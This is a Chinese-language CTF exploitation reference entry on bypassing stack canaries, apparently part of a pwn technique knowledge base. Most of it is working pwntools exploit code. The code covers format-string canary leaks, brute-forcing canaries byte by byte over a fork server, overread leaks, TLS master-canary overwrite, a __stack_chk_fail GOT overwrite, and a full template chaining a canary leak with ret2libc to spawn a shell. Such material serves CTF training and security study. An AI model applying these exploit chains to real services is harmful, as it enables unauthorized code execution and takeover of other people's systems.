---
category: pwn
tags: [canary, stack_canary, canary_bypass, brute_force, format_string_leak, stack_leak, tls_canary, fork, 栈保护, 金丝雀, canary绕过, 逐字节爆破]
triggers: [canary, stack canary, stack protector, canary bypass, canary leak, fork server, brute force canary, format string canary, 栈保护, 金丝雀, 绕过canary, __stack_chk_fail]
related: [format_string, ret2libc, rop_chain, shellcode]
---

# Stack Canary 绕过

## 什么时候用

程序开启了栈保护（Stack Canary / Stack Smashing Protector），溢出时必须保持 canary 值不变，否则 `__stack_chk_fail` 会终止程序。需要先泄露或绕过 canary 才能覆盖返回地址。

## 前提条件

- **`checksec` 显示 Canary: enabled**（或看到 `__stack_chk_fail` 引用）
- **有栈溢出漏洞**：溢出范围能覆盖 canary + saved RBP + RIP
- 至少满足以下一种泄露/绕过条件：
  - **fork 服务**：子进程 canary 与父进程相同，可逐字节爆破
  - **格式化字符串漏洞**：用 `%N$p` 泄露栈上的 canary
  - **信息泄露（overread）**：`puts`/`printf` 可打印覆盖后的栈内容
  - **线程 TLS 可写**：通过大范围溢出覆盖 TLS 中的 master canary

### Canary 结构

- x86-64：8 字节，最低字节固定为 `\x00`（防止字符串函数泄露）
- x86-32：4 字节，最低字节固定为 `\x00`
- 栈帧位置：buffer 和 saved RBP 之间
- 函数序言从 `fs:[0x28]` 读取存入栈，函数尾声校验是否被修改

## 攻击步骤

### 1. 方法一：格式化字符串泄露（%N$p）

格式化字符串漏洞可以直接读取栈上的 canary：

```python
from pwn import *

context.binary = elf = ELF('./vuln')
p = process()

# Step 1: 确定 canary 是格式化字符串的第几个参数
# x64 前 6 个参数在寄存器，第 7 个开始才在栈上
# 用 GDB 断在 printf，查看 canary 相对 rsp 的位置
# 或发送 %p.%p.%p... 逐个检查（canary 末尾是 00）

# 假设 canary 在第 17 个参数位置
p.sendline(b'%17$p')
canary = int(p.recvline().strip(), 16)
log.success(f"Canary: {hex(canary)}")

# 验证：最低字节应为 0x00
assert canary & 0xff == 0, "偏移可能不对"

# Step 2: 构造保留 canary 的溢出 payload
payload = b'A' * CANARY_OFFSET
payload += p64(canary)           # 正确的 canary
payload += p64(0)                # saved RBP
payload += p64(target_addr)      # 返回地址
p.sendline(payload)
```

自动化探测 canary 偏移：

```python
for i in range(1, 50):
    p = process('./vuln', level='warn')
    p.sendline(f'%{i}$p'.encode())
    try:
        val = int(p.recvline().strip(), 16)
        if val != 0 and (val & 0xff) == 0 and val < (1 << 64):
            log.info(f"Offset {i}: {hex(val)} <- possible canary")
    except:
        pass
    p.close()
```

### 2. 方法二：逐字节爆破（fork 服务器）

fork 的子进程 canary 与父进程相同。每次连接 canary 不变，逐字节试探（最多 256×7 = 1792 次）：

```python
from pwn import *

CANARY_OFFSET = 0x48  # buffer 到 canary 的距离

def try_byte(known, guess_byte):
    """尝试一个 canary 字节，返回是否正确"""
    try:
        p = remote('localhost', 1337)
        payload = b'A' * CANARY_OFFSET + known + bytes([guess_byte])
        p.sendafter(b'Input: ', payload)
        resp = p.recv(timeout=1)
        p.close()
        return len(resp) > 0  # 有响应说明没 crash
    except EOFError:
        return False

def brute_canary():
    """逐字节爆破 8 字节 canary"""
    canary = b'\x00'  # 最低字节固定为 \x00
    for pos in range(1, 8):
        for guess in range(256):
            if try_byte(canary, guess):
                canary += bytes([guess])
                log.info(f"Byte {pos}: 0x{guess:02x} | {canary.hex()}")
                break
        else:
            log.error(f"Byte {pos} failed")
            return None
    return u64(canary)

canary = brute_canary()
log.success(f"Canary: {hex(canary)}")
```

### 3. 方法三：栈泄露（overread）

覆盖 canary 的 `\x00` 字节，让 `puts`/`printf` 连带打印 canary 剩余字节：

```python
from pwn import *

p = process('./vuln')

# 假设程序: read(buf, N) → puts(buf)
# buffer 大小 0x40，canary 在 buf+0x40

# 发送 0x41 字节，覆盖 canary 首字节的 \x00
p.send(b'A' * (0x40 + 1))

# puts 输出时连带打印 canary 高 7 字节
p.recvuntil(b'A' * 0x41)
canary_bytes = p.recv(7)
canary = u64(b'\x00' + canary_bytes)
log.success(f"Canary: {hex(canary)}")

# 第二轮输入，带上正确 canary
payload = b'A' * 0x40
payload += p64(canary)
payload += p64(0)             # saved RBP
payload += p64(target_addr)
p.send(payload)
p.interactive()
```

### 4. 方法四：线程 TLS canary 覆写

多线程程序中，线程栈和 TLS 由 mmap 分配且通常相邻。如果溢出足够大，同时覆盖栈上 canary 和 TLS 中的 master canary 为相同值：

```python
# 线程栈到 TLS 的距离需要用 GDB 确认
# (gdb) p/x $fs_base       # TLS 基地址
# canary 在 fs_base + 0x28

FAKE_CANARY = p64(0x4141414141414100)  # 自定义值（末尾 \x00）

payload = b'A' * CANARY_OFFSET
payload += FAKE_CANARY                           # 覆写栈上 canary
payload += b'A' * (TLS_DISTANCE - CANARY_OFFSET - 8)
payload += FAKE_CANARY                           # 覆写 TLS master canary
# 两者相同即通过检查
```

### 完整 exploit 模板（format string leak + ret2libc）

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

def conn():
    if args.REMOTE:
        return remote('host', port)
    return process()

p = conn()

# --- Phase 1: 泄露 canary ---
p.sendlineafter(b'> ', b'%17$p')
canary = int(p.recvline().strip(), 16)
log.success(f"Canary: {hex(canary)}")

# --- Phase 2: 泄露 libc ---
rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

payload = b'A' * CANARY_OFFSET
payload += p64(canary)
payload += p64(0)                     # saved RBP
payload += p64(POP_RDI)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])

p.sendlineafter(b'> ', payload)
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.sym['puts']
log.success(f"libc: {hex(libc.address)}")

# --- Phase 3: getshell ---
p.sendlineafter(b'> ', b'%17$p')  # 重新泄露 canary
canary = int(p.recvline().strip(), 16)

payload2 = b'A' * CANARY_OFFSET
payload2 += p64(canary)
payload2 += p64(0)
payload2 += p64(RET)                  # 栈对齐
payload2 += p64(POP_RDI)
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.sym['system'])

p.sendlineafter(b'> ', payload2)
p.interactive()
```

## 常见坑

- **canary 最低字节是 \x00**：泄露时需要覆盖掉这个 \x00 才能让 `puts` 打印出来，然后手动补回。
- **fork vs exec**：`fork()` 保持 canary 不变可以爆破。`exec` 启动新进程则 canary 重新随机化，无法爆破。
- **格式化字符串偏移 ≠ 字节偏移**：`%N$p` 中 N 是参数索引。x64 前 6 个参数在寄存器中，第 7 个开始才在栈上。
- **ASLR + PIE + Canary 全开**：泄露 canary 后还需 PIE 基址和 libc 地址。格式化字符串可一次泄露多个：`%17$p.%19$p.%21$p`。
- **checksec 漏检**：静态二进制 checksec 可能检测不到 canary。手动在 GDB 看函数是否有 `mov rax, fs:[0x28]`。

## 变体

### __stack_chk_fail GOT 覆写

有任意写能力时，覆写 `__stack_chk_fail@GOT` 为 `main` 或 `ret`。canary 校验失败也不会 crash：

```python
writes = {elf.got['__stack_chk_fail']: elf.sym['main']}
payload = fmtstr_payload(offset, writes)
```

### SSP Leak（argv[0] 信息泄露）

某些 glibc 的 `__stack_chk_fail` 会打印 `argv[0]`。覆写 `argv[0]` 指针即可泄露任意地址内容。

### PIE + Canary 双重爆破

fork 服务器中依次爆破 canary → RBP → RIP，从 RIP 推算 PIE 基地址。

## 相关技术

- [[format_string]] — 格式化字符串泄露 canary 和 libc 地址
- [[ret2libc]] — 绕过 canary 后的标准攻击链
- [[rop_chain]] — canary 泄露后构造 ROP 链
- [[shellcode]] — NX 关闭时绕过 canary 后注入 shellcode
